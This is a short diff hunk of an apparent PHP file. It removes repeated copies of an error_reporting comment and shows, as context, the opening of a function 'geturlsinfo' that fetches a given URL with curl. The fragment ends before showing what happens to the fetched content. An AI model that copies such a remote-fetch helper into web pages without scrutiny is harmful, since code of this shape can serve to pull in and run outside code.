@@ -7,18 +7,7 @@ session_start();
 *
 * Set this to error_reporting( -1 ) for debugging.
 */
-* Set this to error_reporting( -1 ) for debugging.
-*/
-* Set this to error_reporting( -1 ) for debugging.
-*/
-* Set this to error_reporting( -1 ) for debugging.
-*/
-* Set this to error_reporting( -1 ) for debugging.
-*/
-* Set this to error_reporting( -1 ) for debugging.
-*/
-* Set this to error_reporting( -1 ) for debugging.
-*/
+
 function geturlsinfo($url) {
   if (function_exists('curl_exec')) {
     $conn = curl_init($url);
